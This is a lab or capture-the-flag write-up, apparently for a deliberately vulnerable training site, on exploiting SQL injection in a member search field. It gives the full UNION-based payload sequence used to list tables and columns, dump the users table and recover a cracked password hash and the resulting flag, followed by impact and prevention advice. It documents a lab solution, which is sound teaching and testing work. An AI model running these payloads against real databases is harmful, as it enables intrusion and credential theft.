# SQL Injection - Member Search

## Vulnerability
The member search field does not validate input, allowing SQL injection.

## Exploitation
1. Navigate to `?page=member`
2. Test with: `5 OR 1=1` → returns all users (one/me, two/me, three/me, Flag/GetThe)
3. Determine column count: `1 ORDER BY 2--` (ok), `1 ORDER BY 3--` (error) → 2 columns
4. Extract tables:
   ```
   1 UNION SELECT table_name, null FROM information_schema.tables--
   ```
   → relevant tables: `users`, `guestbook`, `list_images`, `vote_dbs`
5. Extract columns from `users` (hex to avoid quote escaping, `0x7573657273` = "users"):
   ```
   1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=0x7573657273--
   ```
   → columns: `user_id, first_name, last_name, town, country, planet, Commentaire, countersign`
6. Extract data:
   ```
   1 UNION SELECT Commentaire, countersign FROM users--
   ```
   → last record Commentaire: "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
   → countersign: `5ff9d0165b4f92b14994e5c685cdce28`
7. Crack MD5: `5ff9d0165b4f92b14994e5c685cdce28` → `FortyTwo`
8. Lowercase: `fortytwo`
9. SHA256(`fortytwo`) → flag: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

## Impact
Full database access, credential theft, data manipulation, potential RCE depending on DB privileges.

## Prevention
- Use prepared statements / parameterized queries
- Validate and whitelist input
- Apply principle of least privilege on the database user
